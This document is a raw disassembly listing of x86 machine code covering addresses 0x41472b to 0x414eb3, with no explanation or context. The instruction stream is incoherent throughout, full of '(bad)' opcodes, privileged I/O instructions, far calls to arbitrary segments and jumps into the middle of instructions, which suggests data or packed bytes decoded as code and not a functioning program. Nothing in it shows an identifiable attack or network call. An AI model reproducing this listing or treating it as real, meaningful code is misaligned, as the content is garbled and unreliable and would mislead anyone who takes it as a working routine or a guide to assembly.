  41472b:	sbb    edi,DWORD PTR [edi]
  41472d:	cmp    bl,BYTE PTR [ecx]
  41472f:	call   0xe6a02839
  414734:	outs   dx,BYTE PTR ds:[esi]
  414735:	push   0x3c8b79f5
  41473a:	lea    eax,[ecx]
  41473c:	call   0xf8ed15e4
  414741:	call   0xd12e:0x67ab19a6
  414748:	std    
  414749:	mov    edx,0x44ef0108
  41474e:	cdq    
  41474f:	std    
  414750:	sahf   
  414751:	hlt    
  414752:	sti    
  414753:	stc    
  414754:	add    DWORD PTR [edx],esp
  414756:	jb     0x4147a6
  414758:	das    
  414759:	adc    esp,esi
  41475b:	test   al,0x28
  41475d:	rep lods eax,DWORD PTR ds:[esi]
  41475f:	mov    ecx,0x253fed8e
  414764:	or     BYTE PTR [eax+ecx*8+0x69],dl
  414768:	and    DWORD PTR [eax+0x511c9624],0xffffff8c
  41476f:	mov    DWORD PTR [ebx+0x66],ebx
  414772:	mov    eax,0x5fc66a4f
  414777:	xchg   ebx,eax
  414778:	jecxz  0x414763
  41477a:	inc    edx
  41477b:	cli    
  41477c:	push   0x8b38d88b
  414781:	mov    al,0xb9
  414783:	add    eax,edx
  414785:	push   ebx
  414786:	sub    esp,ebp
  414788:	pop    ss
  414789:	lods   eax,DWORD PTR ds:[esi]
  41478a:	inc    edi
  41478b:	xchg   edi,eax
  41478c:	push   edi
  41478d:	adc    eax,0x57512b2b
  414793:	out    0x4a,eax
  414795:	out    0x3b,al
  414797:	out    0x7a,al
  414799:	je     0x414745
  41479b:	das    
  41479c:	xchg   DWORD PTR [edx-0x73dd52c0],esi
  4147a2:	sbb    bl,BYTE PTR [eax+0x66]
  4147a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147a6:	std    
  4147a7:	dec    edx
  4147a8:	xchg   esp,eax
  4147a9:	push   esi
  4147aa:	inc    edi
  4147ab:	or     BYTE PTR [esi],bh
  4147ad:	test   ah,bl
  4147af:	xlat   BYTE PTR ds:[ebx]
  4147b0:	int    0x29
  4147b2:	jmp    0x22809227
  4147b7:	jmp    0x6b46dce3
  4147bc:	sbb    BYTE PTR [eax+0x2b],dh
  4147bf:	jl     0x414819
  4147c1:	fbld   TBYTE PTR [edi]
  4147c3:	mov    edi,0x388e7d20
  4147c8:	outs   dx,BYTE PTR ds:[esi]
  4147c9:	in     eax,dx
  4147ca:	out    dx,al
  4147cb:	sbb    ch,BYTE PTR [eax-0x33]
  4147ce:	(bad)  
  4147cf:	pushf  
  4147d0:	std    
  4147d1:	in     eax,0xea
  4147d3:	mov    ds:0x25a96a9f,eax
  4147d8:	out    0xf5,eax
  4147da:	pop    ss
  4147db:	scas   eax,DWORD PTR es:[edi]
  4147dc:	fimul  WORD PTR [edi]
  4147de:	pop    edi
  4147df:	and    BYTE PTR ds:0x973094ca,bh
  4147e5:	inc    edi
  4147e6:	xchg   esp,eax
  4147e7:	repnz mov al,0x18
  4147ea:	call   0x91c8fa33
  4147ef:	lods   al,BYTE PTR ds:[esi]
  4147f0:	mov    esp,0xa90f5672
  4147f5:	push   ebx
  4147f6:	(bad)  
  4147f7:	daa    
  4147f8:	mov    al,0xa6
  4147fa:	jl     0x4147c8
  4147fc:	dec    DWORD PTR [ebp+0x5e]
  4147ff:	fadd   DWORD PTR [esi-0x60]
  414802:	pusha  
  414803:	push   0x12
  414805:	outs   dx,DWORD PTR ds:[esi]
  414806:	inc    edx
  414807:	or     edi,DWORD PTR [ecx+0x29]
  41480a:	lods   eax,DWORD PTR ds:[esi]
  41480b:	adc    eax,ebp
  41480d:	hlt    
  41480e:	sbb    al,BYTE PTR [edi]
  414810:	out    dx,al
  414811:	pop    es
  414812:	mov    ebp,DWORD PTR [edi+0x53]
  414815:	dec    edx
  414816:	imul   esp,DWORD PTR [esi],0xfa2df304
  41481c:	dec    ebx
  41481d:	ss sbb dl,ch
  414820:	dec    eax
  414821:	xor    al,0x6e
  414823:	lods   al,BYTE PTR ds:[esi]
  414824:	call   0x4b648292
  414829:	mov    ebp,0x381b940f
  41482e:	push   ecx
  41482f:	lods   eax,DWORD PTR ds:[esi]
  414830:	inc    ebx
  414831:	arpl   WORD PTR [edx+0x7],bx
  414834:	or     BYTE PTR [ebp+0x3741d6ba],0x39
  41483b:	(bad)  
  41483c:	int3   
  41483d:	jl     0x414817
  41483f:	clc    
  414840:	pop    ss
  414841:	sar    DWORD PTR [edx],1
  414843:	mul    DWORD PTR ds:0xada8bbf0
  414849:	or     ecx,DWORD PTR [edi+esi*2]
  41484c:	(bad)  
  41484d:	fist   DWORD PTR es:[eax-0x5ca6ee35]
  414854:	add    ah,cl
  414856:	ret    0x6689
  414859:	imul   ebp,edx,0xfffffff6
  41485c:	xor    esp,DWORD PTR ds:0xf8771587
  414862:	xor    ch,BYTE PTR [eax-0x2c61798c]
  414868:	fsub   QWORD PTR [ebx]
  41486a:	into   
  41486b:	sub    eax,0x17a525ea
  414870:	pop    esp
  414871:	leave  
  414872:	jmp    0x41486d
  414874:	jmp    0x41485c
  414876:	sub    ah,BYTE PTR [esi-0x1c]
  414879:	xchg   edi,eax
  41487a:	xchg   ebx,eax
  41487b:	xchg   ebx,eax
  41487c:	push   ss
  41487d:	or     al,0x3
  41487f:	sti    
  414880:	dec    ebp
  414881:	ds jnp 0x414834
  414884:	icebp  
  414885:	sahf   
  414886:	and    eax,0x6d5fede8
  41488b:	jbe    0x4148d4
  41488d:	mov    esp,ecx
  41488f:	(bad)  [edx+edx*2+0x52c77c95]
  414896:	scas   eax,DWORD PTR es:[edi]
  414897:	adc    DWORD PTR [ecx],0x1cf3342b
  41489d:	adc    al,0x1e
  41489f:	xchg   edx,eax
  4148a0:	fdiv   QWORD PTR [eax+0x7043de01]
  4148a6:	mov    WORD PTR [ebx-0x54],es
  4148a9:	dec    edx
  4148aa:	jbe    0x414880
  4148ac:	mov    al,0xeb
  4148ae:	cdq    
  4148af:	ds loop 0x41488e
  4148b2:	cmp    al,0x77
  4148b4:	mul    BYTE PTR [edi]
  4148b6:	neg    DWORD PTR [edx+0x14e09904]
  4148bc:	(bad)  
  4148bd:	fild   WORD PTR [esi]
  4148bf:	aas    
  4148c0:	inc    eax
  4148c1:	dec    ebx
  4148c2:	leave  
  4148c3:	(bad)  
  4148c4:	mov    ebp,esp
  4148c6:	call   0xddbb9398
  4148cb:	inc    ebp
  4148cc:	mov    al,0x51
  4148ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148cf:	xchg   edi,eax
  4148d0:	push   esp
  4148d1:	dec    edi
  4148d2:	mov    ds:0x3e1a3ccb,eax
  4148d7:	in     eax,0xae
  4148d9:	adc    ecx,DWORD PTR [ebp+0x15]
  4148dc:	jnp    0x4148d6
  4148de:	dec    eax
  4148df:	ret    0xf266
  4148e2:	xor    eax,0xa267c644
  4148e7:	cmc    
  4148e8:	mov    ds:0xb1435c74,eax
  4148ed:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ef:	adc    eax,0x6f5f329a
  4148f4:	outs   dx,DWORD PTR ds:[esi]
  4148f5:	bnd jmp 0x41495d
  4148f8:	or     ecx,DWORD PTR [edx-0x33f0e57f]
  4148fe:	push   0x64
  414900:	pop    ss
  414901:	outs   dx,BYTE PTR ss:[esi]
  414903:	sub    eax,DWORD PTR [ecx+0x45e6eba9]
  414909:	(bad)  
  41490a:	loop   0x4148e0
  41490c:	inc    eax
  41490d:	in     al,dx
  41490e:	jbe    0x4148a4
  414910:	out    dx,eax
  414911:	in     eax,dx
  414912:	cli    
  414913:	mov    bh,0x42
  414915:	ficomp WORD PTR [esi+0x72]
  414918:	fldenv [ebx-0x2f]
  41491b:	pop    ebx
  41491c:	ret    
  41491d:	out    dx,eax
  41491e:	inc    esp
  41491f:	outs   dx,BYTE PTR ds:[esi]
  414920:	jge    0x414966
  414922:	mov    eax,ds:0x75e07720
  414927:	pop    es
  414928:	inc    ebx
  414929:	and    ebx,DWORD PTR [edx+ebp*1-0x73]
  41492d:	retf   
  41492e:	pop    edx
  41492f:	adc    eax,0xca566b8f
  414934:	sub    al,0xef
  414936:	ret    
  414937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414938:	pop    eax
  414939:	dec    esp
  41493a:	jno    0x414924
  41493c:	inc    eax
  41493d:	dec    edx
  41493e:	in     eax,dx
  41493f:	sbb    DWORD PTR [ebx],edi
  414941:	retf   0x7b62
  414944:	rdpmc  
  414946:	inc    ebp
  414947:	pop    esp
  414948:	push   eax
  414949:	dec    esi
  41494a:	es push esi
  41494c:	push   esp
  41494d:	sub    ebp,DWORD PTR [ebp-0x28d8d172]
  414953:	(bad)  
  414954:	xor    BYTE PTR [esp+ebp*1-0x724c7bef],cl
  41495b:	push   ss
  41495c:	xchg   esp,eax
  41495d:	pop    ebp
  41495e:	jb     0x4149a4
  414960:	mov    edx,0x33ef696b
  414965:	dec    edi
  414966:	imul   ebp,DWORD PTR [esi-0x5c5cf8b6],0xeb54176
  414970:	std    
  414971:	(bad)  
  414972:	in     al,dx
  414973:	mov    esp,0x91319b90
  414978:	push   esi
  414979:	jae    0x4149c6
  41497b:	add    edi,DWORD PTR [ecx+0x78769676]
  414981:	cmp    eax,0xf1778b67
  414986:	xchg   edx,eax
  414987:	jbe    0x414963
  414989:	clc    
  41498a:	in     eax,dx
  41498b:	scas   al,BYTE PTR es:[edi]
  41498c:	lahf   
  41498d:	xor    dh,bl
  41498f:	retf   0x89cf
  414992:	jp     0x4149f1
  414994:	pop    es
  414995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414996:	addr16 loopne 0x414994
  414999:	inc    ebx
  41499a:	test   BYTE PTR [eax+0x168fe941],0x90
  4149a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a2:	cmp    esp,DWORD PTR [ecx-0x10]
  4149a5:	or     BYTE PTR [edi+0x5124114],bh
  4149ab:	repnz icebp 
  4149ad:	out    0x17,al
  4149af:	neg    DWORD PTR ds:0xf39ec2fb
  4149b5:	xor    BYTE PTR [ebx+edx*2+0x1e],dh
  4149b9:	sbb    DWORD PTR [ecx+eiz*2],esi
  4149bc:	out    0x6,al
  4149be:	ror    DWORD PTR ds:0x4f172d32,0xec
  4149c5:	lock call 0x7a5b:0xda8568ea
  4149cd:	push   esp
  4149ce:	push   edi
  4149cf:	fcmovu st,st(1)
  4149d1:	(bad)  
  4149d2:	cli    
  4149d3:	xchg   ebx,eax
  4149d4:	shr    DWORD PTR [ecx],1
  4149d6:	sub    bh,BYTE PTR [edx]
  4149d8:	imul   esi,DWORD PTR [esi],0x2f
  4149db:	out    0x98,eax
  4149dd:	mov    cl,0x16
  4149df:	cmp    DWORD PTR [edi+0x59],esi
  4149e2:	or     dl,BYTE PTR [ebp+0x12]
  4149e5:	mov    edi,0x4635c117
  4149ea:	xor    edi,DWORD PTR [esi]
  4149ec:	mov    esp,0xe03b350b
  4149f1:	into   
  4149f2:	or     DWORD PTR [esi+ebx*4],0xffffff80
  4149f6:	mov    cs,WORD PTR [ecx+ebp*1]
  4149f9:	in     eax,dx
  4149fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149fb:	(bad)  
  4149fc:	or     dh,BYTE PTR [eax+0x5c]
  4149ff:	ds cli 
  414a01:	dec    ebp
  414a02:	iret   
  414a03:	leave  
  414a04:	cmp    cl,ah
  414a06:	cli    
  414a07:	mov    eax,DWORD PTR [ebp-0x251d45c2]
  414a0d:	adc    dl,al
  414a0f:	out    dx,eax
  414a10:	sbb    BYTE PTR [esi-0x237b99a4],cl
  414a16:	or     BYTE PTR [esp],dh
  414a19:	ret    
  414a1a:	in     al,0xec
  414a1c:	push   ds
  414a1d:	mov    ah,0x39
  414a1f:	xor    bl,BYTE PTR [esi+0x76c1b34d]
  414a25:	in     al,0xc
  414a27:	jmp    0x414a1d
  414a29:	nop
  414a2a:	fsub   DWORD PTR [eax+0x1df54dbf]
  414a30:	das    
  414a31:	popf   
  414a32:	cwde   
  414a33:	std    
  414a34:	jle    0x414a73
  414a36:	outs   dx,DWORD PTR ds:[esi]
  414a37:	xchg   ecx,eax
  414a38:	mov    esi,0xd7cf254f
  414a3d:	retf   
  414a3e:	jecxz  0x414aa9
  414a40:	lahf   
  414a41:	adc    al,dh
  414a43:	(bad)  [edx+eax*2+0x5f]
  414a47:	(bad)  
  414a48:	and    eax,0xfed59380
  414a4d:	out    0x41,al
  414a4f:	mov    DWORD PTR [ebx],esp
  414a51:	inc    ebp
  414a52:	mov    dl,BYTE PTR [esi-0x39]
  414a55:	push   cs
  414a56:	adc    cl,BYTE PTR [ebx+0x1c]
  414a59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a5a:	ret    0x9a1
  414a5d:	mov    eax,0x51a16ce2
  414a62:	mov    cl,dh
  414a64:	(bad)
  414a67:	sub    DWORD PTR [ebx],ebx
  414a69:	mov    edx,0x403fb786
  414a6e:	fadd   DWORD PTR [ebp+0x2d922da7]
  414a74:	mov    DWORD PTR [ecx+0x2f],esp
  414a77:	mov    al,BYTE PTR [eax+eax*8]
  414a7a:	push   ecx
  414a7b:	out    dx,eax
  414a7c:	inc    edx
  414a7d:	int3   
  414a7e:	fmul   DWORD PTR [edx+ebx*2]
  414a81:	sub    dl,BYTE PTR [edx-0xb9dbc1b]
  414a87:	aas    
  414a88:	out    dx,eax
  414a89:	popf   
  414a8a:	sahf   
  414a8b:	stos   BYTE PTR es:[edi],al
  414a8c:	xor    al,BYTE PTR [edi+esi*8]
  414a8f:	call   0xe712b65e
  414a94:	nop
  414a95:	cmp    esp,esp
  414a97:	pop    ebx
  414a98:	stos   BYTE PTR es:[edi],al
  414a99:	sub    DWORD PTR [ecx-0x66fde3e3],edx
  414a9f:	loopne 0x414a94
  414aa1:	sbb    ebx,ecx
  414aa3:	nop
  414aa4:	inc    esi
  414aa5:	icebp  
  414aa6:	sbb    dh,bl
  414aa8:	(bad)  
  414aa9:	sti    
  414aaa:	bnd jl 0x414b23
  414aad:	(bad)  
  414aae:	xor    al,0xf0
  414ab0:	fdiv   st(6),st
  414ab2:	(bad)  
  414ab3:	fidivr WORD PTR [esi+0x47]
  414ab6:	daa    
  414ab7:	xchg   ebx,eax
  414ab8:	es pushf 
  414aba:	aam    0xdd
  414abc:	lods   al,BYTE PTR ds:[esi]
  414abd:	call   0x67f2:0x92b1cc08
  414ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac5:	jne    0x414a4a
  414ac7:	in     eax,dx
  414ac8:	xchg   BYTE PTR [edx],ch
  414aca:	jne    0x414b2b
  414acc:	icebp  
  414acd:	addr16 mov dl,0x54
  414ad0:	out    dx,eax
  414ad1:	(bad)  
  414ad2:	jmp    0x414ae6
  414ad4:	adc    DWORD PTR [eax],edi
  414ad6:	mov    ds:0x4a10db5b,eax
  414adb:	cmp    eax,0x456883a3
  414ae0:	mov    cl,BYTE PTR [ebp-0x7a]
  414ae3:	xor    BYTE PTR [esi+0x7e],0x60
  414ae7:	add    eax,ecx
  414ae9:	pop    ebx
  414aea:	test   eax,0xa7cc3c63
  414aef:	jmp    0x959:0xce4a425e
  414af6:	dec    ebp
  414af7:	xor    BYTE PTR [esi-0x2c],dl
  414afa:	xchg   ebp,eax
  414afb:	sbb    eax,0xc3a90499
  414b00:	pop    es
  414b01:	mov    dl,0xb3
  414b03:	push   0xffffff96
  414b05:	sbb    dh,BYTE PTR [ebx+ebx*2-0x58]
  414b09:	push   ds
  414b0a:	not    BYTE PTR [edx-0x390b11c6]
  414b10:	pop    esp
  414b11:	push   esi
  414b12:	adc    BYTE PTR [edi+0x7a4ff356],0xe9
  414b19:	ret    
  414b1a:	call   0xd087:0xeb42b662
  414b21:	iret   
  414b22:	adc    al,0x75
  414b24:	mov    al,ds:0x9db7c0e1
  414b29:	repz cwde 
  414b2b:	out    0x4f,eax
  414b2d:	and    DWORD PTR [edi],ecx
  414b2f:	loopne 0x414ab5
  414b31:	add    DWORD PTR [ebx],ecx
  414b33:	lods   al,BYTE PTR ds:[esi]
  414b34:	mov    edi,0xf0b27f6e
  414b39:	xchg   ecx,eax
  414b3a:	pop    ss
  414b3b:	and    DWORD PTR [ecx],ebp
  414b3d:	dec    bp
  414b3f:	mov    edx,DWORD PTR [edi-0x62]
  414b42:	add    edi,edx
  414b44:	aas    
  414b45:	ins    DWORD PTR es:[edi],dx
  414b46:	pushf  
  414b47:	push   0x32
  414b49:	mov    esp,0xf5caeee7
  414b4e:	loope  0x414bad
  414b50:	cwde   
  414b51:	pop    es
  414b52:	cld    
  414b53:	mov    dl,0xf
  414b55:	sbb    cl,BYTE PTR ds:0xcfd24ecc
  414b5b:	out    dx,eax
  414b5c:	sahf   
  414b5d:	pop    esi
  414b5e:	xor    al,0xe0
  414b60:	inc    eax
  414b61:	dec    ebp
  414b62:	out    0x7a,al
  414b64:	repnz fs (bad) 
  414b67:	out    dx,al
  414b68:	cmp    cl,BYTE PTR [esi+0x79a36bf1]
  414b6e:	fadd   st(4),st
  414b70:	pop    es
  414b71:	jnp    0x414b16
  414b73:	lock in eax,dx
  414b75:	mov    bl,0xfb
  414b77:	jno    0x414b86
  414b79:	ja     0x414b64
  414b7b:	retf   0x6080
  414b7e:	in     al,0x2b
  414b80:	mov    al,ds:0x975c4284
  414b85:	test   eax,0x789d52bb
  414b8a:	sub    DWORD PTR [esi],0xb125a98c
  414b90:	and    ah,BYTE PTR [ecx+0x6e]
  414b93:	fisub  WORD PTR [ebx-0x33]
  414b96:	(bad)  
  414b97:	dec    ax
  414b99:	mov    al,ds:0xe612e983
  414b9e:	xlat   BYTE PTR ds:[ebx]
  414b9f:	loop   0x414b63
  414ba1:	ds jmp 0x414beb
  414ba4:	sti    
  414ba5:	jecxz  0x414b8d
  414ba7:	cmp    BYTE PTR [esi+0x62],ch
  414baa:	pop    ebp
  414bab:	push   ss
  414bac:	out    0x7c,eax
  414bae:	or     BYTE PTR cs:[ebp-0x5a],bl
  414bb2:	movntq QWORD PTR [ebp-0x7d9f4bc6],mm6
  414bb9:	jnp    0x414b8e
  414bbb:	jl     0x414b83
  414bbd:	pop    esi
  414bbe:	and    al,0xf6
  414bc0:	jle    0x414be8
  414bc2:	fnstcw WORD PTR [eax-0x26c735dd]
  414bc8:	inc    ebx
  414bc9:	repz mov ebp,0x4a86337
  414bcf:	mov    esi,0x866b4379
  414bd4:	mov    ?,WORD PTR [ebx]
  414bd6:	inc    esp
  414bd7:	ret    
  414bd8:	jmp    0x4cc2:0x5710c3f5
  414bdf:	adc    BYTE PTR [ecx+eiz*1+0x797a2de7],al
  414be6:	cld    
  414be7:	mov    esp,DWORD PTR [ebp*4+0x59b580ce]
  414bee:	mov    bh,0xb6
  414bf0:	push   0xca680833
  414bf5:	xor    al,0xdc
  414bf7:	adc    BYTE PTR [edi],dl
  414bf9:	ss cmp eax,esp
  414bfc:	or     esp,DWORD PTR [edi+0x64]
  414bff:	xor    edi,DWORD PTR [edx-0x31]
  414c02:	outs   dx,BYTE PTR ds:[esi]
  414c03:	mov    al,0xd3
  414c05:	inc    edi
  414c06:	stc    
  414c07:	add    DWORD PTR [eiz*2-0x767378d1],edx
  414c0e:	sbb    al,0xfd
  414c10:	pop    ds
  414c11:	cld    
  414c12:	inc    ebx
  414c13:	repnz les eax,FWORD PTR [eax]
  414c16:	into   
  414c17:	and    al,0xb6
  414c19:	cmp    ch,bl
  414c1b:	and    dh,0xc3
  414c1e:	iret   
  414c1f:	xchg   edi,eax
  414c20:	adc    BYTE PTR ds:0x7f939706,ch
  414c26:	(bad)  
  414c27:	jne    0x414c2f
  414c29:	out    0x75,eax
  414c2b:	xor    BYTE PTR [esi],ch
  414c2d:	sbb    esi,DWORD PTR [ebp+0x4]
  414c30:	push   esp
  414c31:	test   ah,0xa1
  414c34:	int3   
  414c35:	cwde   
  414c36:	or     BYTE PTR [edx],0xa4
  414c39:	mov    ch,0xd1
  414c3b:	cld    
  414c3c:	mov    esi,0xc5562c65
  414c41:	mov    bl,0x88
  414c43:	sahf   
  414c44:	fidivr DWORD PTR [esi]
  414c46:	es mov edx,0xd46c481b
  414c4c:	push   ebp
  414c4d:	push   cs
  414c4e:	pop    edi
  414c4f:	rcr    edi,cl
  414c51:	out    0xa2,al
  414c53:	inc    eax
  414c54:	mov    DWORD PTR [esi+eax*1+0x564667b5],esp
  414c5b:	(bad)  
  414c5c:	popf   
  414c5d:	outs   dx,BYTE PTR ds:[esi]
  414c5e:	cmp    bl,BYTE PTR [ecx+0x3d8678e6]
  414c64:	cmc    
  414c65:	dec    ebp
  414c66:	sbb    cl,BYTE PTR [edx]
  414c68:	mov    DWORD PTR [edi+ebx*2-0x1d],ebp
  414c6c:	or     ecx,0xd1b8ebdd
  414c72:	xchg   ebx,eax
  414c73:	mov    eax,0x19ad3533
  414c78:	imul   edi
  414c7a:	dec    ecx
  414c7b:	in     al,0x17
  414c7d:	mov    dl,0x49
  414c7f:	lods   eax,DWORD PTR ds:[esi]
  414c80:	dec    ebx
  414c81:	fnstsw WORD PTR [edi]
  414c83:	hlt    
  414c84:	rol    BYTE PTR [ebp+0x4d6cf86a],cl
  414c8a:	lods   al,BYTE PTR ds:[esi]
  414c8b:	adc    DWORD PTR [edi-0x12827c94],esi
  414c91:	das    
  414c92:	fbstp  TBYTE PTR [esi+0x4d437588]
  414c98:	pop    ebx
  414c99:	push   esp
  414c9a:	(bad)  
  414c9b:	jle    0x414c3f
  414c9d:	inc    ecx
  414c9e:	mov    ah,0xd6
  414ca0:	std    
  414ca1:	shl    BYTE PTR [edx],0xa1
  414ca4:	add    BYTE PTR [eax+0x29],ah
  414ca7:	xchg   edx,eax
  414ca8:	or     DWORD PTR [esi+0x6b3499a4],ecx
  414cae:	jge    0x414cf0
  414cb0:	sbb    eax,0xdba59a97
  414cb5:	in     al,0xa4
  414cb7:	aam    0xef
  414cb9:	pusha  
  414cba:	les    ebx,FWORD PTR [ebp+0x6]
  414cbd:	dec    ebx
  414cbe:	nop
  414cbf:	xchg   esp,eax
  414cc0:	inc    edi
  414cc1:	imul   edx,DWORD PTR [ebx-0x6b],0xffffffba
  414cc5:	mov    ds:0xa511c239,al
  414cca:	adc    DWORD PTR [eax+0x4c7289a6],ebp
  414cd0:	pop    es
  414cd1:	ret    0x53dc
  414cd4:	xor    bh,dh
  414cd6:	add    DWORD PTR [edi-0x72],ecx
  414cd9:	inc    edi
  414cda:	daa    
  414cdb:	scas   eax,DWORD PTR es:[edi]
  414cdc:	mov    eax,ds:0xa6691667
  414ce1:	sub    edi,ebx
  414ce3:	out    dx,al
  414ce4:	shl    dl,1
  414ce6:	stos   BYTE PTR es:[edi],al
  414ce7:	adc    al,0x29
  414ce9:	push   0xffffff8e
  414ceb:	cmc    
  414cec:	pop    esi
  414ced:	js     0x414d07
  414cef:	mov    DWORD PTR [ecx+0x51],ecx
  414cf2:	dec    esi
  414cf3:	addr16 dec eax
  414cf5:	pop    ss
  414cf6:	jge    0x414c9e
  414cf8:	mov    ds:0x95ce01ba,al
  414cfd:	call   0x8530:0xce37a90d
  414d04:	inc    eax
  414d05:	in     eax,0x51
  414d07:	popf   
  414d08:	fst    QWORD PTR [esi+0x69ef58f3]
  414d0e:	push   cs
  414d0f:	xor    eax,DWORD PTR [edi+ebx*1+0x6185314f]
  414d16:	push   edi
  414d17:	sub    esp,edx
  414d19:	fwait
  414d1a:	shl    BYTE PTR [esi+0x52],1
  414d1d:	call   0xe133:0xd056ecbf
  414d24:	sti    
  414d25:	jge    0x414d1b
  414d27:	mov    ds:0xb56639c2,eax
  414d2c:	or     eax,esi
  414d2e:	daa    
  414d2f:	dec    eax
  414d30:	xchg   ecx,eax
  414d31:	push   es
  414d32:	adc    BYTE PTR [ebp-0x3a],0xf7
  414d36:	inc    esp
  414d37:	mov    eax,0x255280b8
  414d3c:	mov    bl,0x6e
  414d3e:	mov    eax,DWORD PTR [ecx-0x2ba6ae81]
  414d44:	dec    ebp
  414d45:	pop    ecx
  414d46:	push   es
  414d47:	cmp    eax,0xe3e75cb3
  414d4c:	add    eax,0x86c9527d
  414d51:	lods   al,BYTE PTR ds:[esi]
  414d52:	or     ch,al
  414d54:	in     eax,0xab
  414d56:	inc    ecx
  414d57:	loopne 0x414d2c
  414d59:	and    bh,BYTE PTR [eax]
  414d5b:	push   cs
  414d5c:	and    eax,0xcd584749
  414d61:	cs jno 0x414d40
  414d64:	sbb    DWORD PTR [ebx-0x42],eax
  414d67:	daa    
  414d68:	popf   
  414d69:	xchg   ecx,eax
  414d6a:	je     0x414d49
  414d6c:	xchg   DWORD PTR [eax+0xff86c1f],esp
  414d72:	inc    edx
  414d73:	out    0x62,eax
  414d75:	dec    eax
  414d76:	cdq    
  414d77:	inc    ebp
  414d78:	jbe    0x414dd5
  414d7a:	shl    BYTE PTR [ebp-0x3a1a3051],0x8a
  414d81:	fisttp WORD PTR [ecx-0x101998a1]
  414d87:	dec    esp
  414d88:	mov    ah,al
  414d8a:	fxch   st(4)
  414d8c:	adc    dh,bl
  414d8e:	ror    BYTE PTR gs:[ebx+edx*4],cl
  414d92:	adc    ah,BYTE PTR [esp+esi*4-0x65]
  414d96:	call   0xb04f47ba
  414d9b:	test   DWORD PTR [edi+0x4b8e1a5e],esi
  414da1:	les    eax,FWORD PTR [ebx+esi*4-0x6bfc973c]
  414da8:	lods   al,BYTE PTR ds:[esi]
  414da9:	and    BYTE PTR [ebx-0x66246033],al
  414daf:	aaa    
  414db0:	fld    DWORD PTR [edi+0xafd0f43]
  414db6:	cmp    BYTE PTR [eax+0x32],al
  414db9:	jecxz  0x414dd8
  414dbb:	or     eax,0xd69bcfed
  414dc0:	add    BYTE PTR [edx],0x19
  414dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dc4:	mov    al,0x9e
  414dc6:	mov    ch,0x62
  414dc8:	xlat   BYTE PTR ds:[ebx]
  414dc9:	aaa    
  414dca:	idiv   esp
  414dcc:	punpcklbw mm0,DWORD PTR [edi+ebp*2+0x4d]
  414dd1:	or     eax,0xaa08c2ed
  414dd6:	jnp    0x414df2
  414dd8:	add    ebx,edi
  414dda:	xchg   BYTE PTR [ecx],bl
  414ddc:	jl     0x414d98
  414dde:	adc    al,0x9e
  414de0:	inc    si
  414de2:	sbb    ah,BYTE PTR [esi-0x79ee8cfd]
  414de8:	add    ebx,DWORD PTR [esp+eax*1-0x71]
  414dec:	ret    
  414ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dee:	sub    eax,DWORD PTR [edi+0x2e7078c9]
  414df4:	cwde   
  414df5:	push   edi
  414df6:	inc    eax
  414df7:	jge    0x414e68
  414df9:	fisub  WORD PTR [esi]
  414dfb:	(bad)  [eax-0x35]
  414dfe:	dec    esi
  414dff:	cmp    eax,0x6da7c211
  414e04:	add    DWORD PTR [edx-0x4b78d8e5],edx
  414e0a:	aaa    
  414e0b:	fsubr  st(2),st
  414e0d:	pop    ebp
  414e0e:	jl     0x414e0c
  414e10:	mov    WORD PTR [edx-0x1e483ab6],cs
  414e16:	mov    BYTE PTR [ecx+0x516a4a2c],dl
  414e1c:	int3   
  414e1d:	daa    
  414e1e:	aad    0xdf
  414e20:	daa    
  414e21:	lods   eax,DWORD PTR ds:[esi]
  414e22:	fimul  WORD PTR [ecx+ebp*1]
  414e25:	push   ss
  414e26:	xchg   ebp,eax
  414e27:	test   BYTE PTR [ecx-0x6b],al
  414e2a:	rol    esp,1
  414e2c:	mov    dl,0x87
  414e2e:	xlat   BYTE PTR ds:[ebx]
  414e2f:	popf   
  414e30:	cmp    BYTE PTR [edx-0x704e8ee4],dh
  414e36:	stos   DWORD PTR es:[edi],eax
  414e37:	and    al,0xfe
  414e39:	jg     0x414e75
  414e3b:	call   0x3982a6af
  414e40:	lock (bad) 
  414e42:	mov    eax,0xb2f3de32
  414e47:	imul   edx,esi,0x7b
  414e4a:	sbb    eax,0xfa05673
  414e4f:	ds iret 
  414e51:	inc    ecx
  414e52:	pop    eax
  414e53:	xchg   BYTE PTR [edi+0x7be69b96],cl
  414e59:	ds push ss
  414e5b:	push   edi
  414e5c:	push   ds
  414e5d:	or     esp,esi
  414e5f:	dec    ebp
  414e60:	ins    BYTE PTR es:[edi],dx
  414e61:	jo     0x414e6b
  414e63:	sar    BYTE PTR [edi],0xa4
  414e66:	xor    DWORD PTR [eax+edi*1+0x0],0xffffff94
  414e6b:	or     ecx,ecx
  414e6d:	or     BYTE PTR [eax+eax*1-0x1b],cl
  414e71:	xchg   DWORD PTR [ebx-0x5e],edi
  414e74:	lds    esp,FWORD PTR [ebx]
  414e76:	add    dh,BYTE PTR [eax]
  414e78:	mov    DWORD PTR [edi],ecx
  414e7a:	fdiv   QWORD PTR [ecx+0x3cc5a2b3]
  414e80:	(bad)  
  414e81:	stc    
  414e82:	sar    DWORD PTR [esi],1
  414e84:	add    bh,dl
  414e86:	or     cl,cl
  414e88:	push   0x9ab6ba9c
  414e8d:	gs cwde 
  414e8f:	stos   DWORD PTR es:[edi],eax
  414e90:	stc    
  414e91:	fcomp  DWORD PTR [ebx+ecx*8-0x5322d7fd]
  414e98:	(bad)  
  414e99:	in     eax,dx
  414e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e9b:	jg     0x414e73
  414e9d:	ror    DWORD PTR [eax],cl
  414e9f:	adc    BYTE PTR [eax-0x47],0x36
  414ea3:	gs mov dh,0xf3
  414ea6:	sub    al,0x9c
  414ea8:	mov    ds:0x8d5e620,eax
  414ead:	xchg   edi,eax
  414eae:	lods   al,BYTE PTR ds:[esi]
  414eaf:	dec    ebp
  414eb0:	and    edi,DWORD PTR [esi]
  414eb2:	(bad)  
  414eb3:	retf   
